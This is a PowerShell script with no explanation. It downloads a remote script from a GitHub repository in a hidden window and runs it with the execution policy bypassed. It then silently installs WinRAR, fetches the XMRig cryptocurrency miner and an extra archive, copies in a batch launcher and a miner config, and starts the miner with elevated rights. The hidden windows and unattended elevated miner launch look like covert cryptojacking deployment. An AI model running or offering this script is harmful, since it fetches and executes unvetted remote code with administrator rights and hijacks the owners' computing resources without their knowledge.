Start-Process powershell.exe  "Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/configure_system.ps1 -OutFile C:\configure_system.ps1" -WindowStyle Hidden
Start-Process powershell.exe -ExecutionPolicy Bypass -File "C:\configure_system.ps1" -WindowStyle Hidden
Start-Process powershell.exe  "Invoke-WebRequest -Uri 'https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-701.exe' -OutFile 'C:\winrar-x64-701.exe'" -WindowStyle Hidden
powershell.exe  "Start-Process -FilePath 'C:\winrar-x64-701.exe' -ArgumentList '/S' -Verb RunAs"
powershell.exe  "Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-gcc-win64.zip -OutFile C:\xmrig-6.22.2-gcc-win64.zip"
powershell.exe  "& 'C:\Program Files\WinRAR\WinRAR.exe' x -ibck -y 'C:\xmrig-6.22.2-gcc-win64.zip' 'C:\'"
powershell.exe  "Start-Sleep -Seconds 3"
powershell.exe  "Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/main/ZEPHSETUP.rar -OutFile C:\ZEPHSETUP.rar"
powershell.exe  "& 'C:\Program Files\WinRAR\WinRAR.exe' x -ibck -y 'C:\ZEPHSETUP.rar' 'C:\'"
powershell.exe  "Start-Sleep -Seconds 2"
powershell.exe  "Copy-Item -Path C:\ZEPHYRUN.bat -Destination C:\xmrig-6.22.2\ZEPHYRUN.bat -Force"
powershell.exe  "Copy-Item -Path C:\config.json -Destination C:\xmrig-6.22.2\config.json -Force"
powershell.exe  "Start-Process -FilePath 'C:\xmrig-6.22.2\ZEPHYRUN.bat' -ArgumentList '/S' -Verb RunAs"
powershell.exe exit
